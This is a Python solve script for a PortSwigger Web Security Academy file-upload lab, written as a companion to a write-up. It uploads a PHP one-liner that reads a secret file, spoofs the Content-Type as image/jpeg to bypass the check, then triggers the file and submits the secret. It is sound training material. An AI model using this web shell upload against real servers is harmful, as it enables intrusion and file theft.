#!/usr/bin/env python3
"""
Web shell upload via Content-Type restriction bypass
PortSwigger Web Security Academy -- File Upload

Companion script for the writeup: 02-web-shell-upload-via-content-type-restriction-bypass.md

What this does:
    Logs in, then uploads exploit.php (same PHP secret-reading one-liner as
    lab 1) with the multipart part's Content-Type header spoofed to
    image/jpeg. The server only checks that client-supplied header, not the
    actual bytes, so the same PHP payload that gets rejected under its real
    Content-Type sails through under a fake one. Fetches the file back to
    trigger execution and read the secret.

Usage:
    python 02-web-shell-upload-via-content-type-restriction-bypass.py <lab-url>
    e.g. python 02-web-shell-upload-via-content-type-restriction-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

PHP_SHELL = "<?php echo file_get_contents('/home/carlos/secret'); ?>"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str) -> bool:
    csrf = _get_csrf(client, f"{base}/login")
    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return "session" in str(client.cookies)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, verify=False, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    csrf = _get_csrf(client, f"{lab_url}/my-account")

    # First confirm the real Content-Type gets rejected, same as our investigation.
    r_blocked = client.post(f"{lab_url}/my-account/avatar",
                            files={"avatar": ("exploit.php", PHP_SHELL.encode(), "application/x-php")},
                            data={"csrf": csrf, "user": "wiener"})
    print(f"[*] Upload with real Content-Type: {r_blocked.status_code} -- "
          f"{'rejected' if 'not a valid' in r_blocked.text.lower() or r_blocked.status_code != 200 else 'unexpectedly accepted'}")

    csrf = _get_csrf(client, f"{lab_url}/my-account")
    r = client.post(f"{lab_url}/my-account/avatar",
                    files={"avatar": ("exploit.php", PHP_SHELL.encode(), "image/jpeg")},
                    data={"csrf": csrf, "user": "wiener"})
    print(f"[*] Upload with spoofed image/jpeg Content-Type: {r.status_code}")

    file_url = f"{lab_url}/files/avatars/exploit.php"
    fetched = client.get(file_url)
    secret = fetched.text.strip()
    print(f"[*] Fetched {file_url} -- body: {secret[:200]!r}")

    if not secret or "<?php" in secret:
        print("[-] File did not execute -- no secret recovered")
        return

    print(f"[+] Secret: {secret}")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
